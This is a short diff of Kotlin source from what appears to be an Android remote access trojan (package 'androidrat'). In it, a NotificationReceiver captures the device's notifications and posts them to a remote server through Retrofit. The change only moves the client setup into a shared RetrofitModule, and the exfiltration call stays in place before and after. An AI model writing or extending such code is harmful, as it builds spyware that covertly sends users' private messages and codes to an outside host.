@@ -4,6 +4,7 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.util.Log
+import com.nqmgaming.androidrat.core.di.RetrofitModule
 import com.nqmgaming.androidrat.core.util.Constant
 import com.nqmgaming.androidrat.data.ApiService
 import com.nqmgaming.androidrat.data.dto.NotificationDto
@@ -43,17 +44,9 @@ class NotificationReceiver : BroadcastReceiver() {
 
                 println("Notification received: $notificationDto")
 
-                val retrofit = Retrofit.Builder()
-                    .baseUrl(Constant.BASE_URL)
-                    .addConverterFactory(GsonConverterFactory.create())
-                    .build()
-
-                val apiService = retrofit.create(ApiService::class.java)
-
-
                 CoroutineScope(Dispatchers.IO).launch {
                     try {
-                        val response = apiService.postNotification(notificationDto)
+                        val response = RetrofitModule.api.postNotification(notificationDto)
                         val responseBody = response.execute().body()
                         println("Notification sent successfully")
                     } catch (e: Exception) {
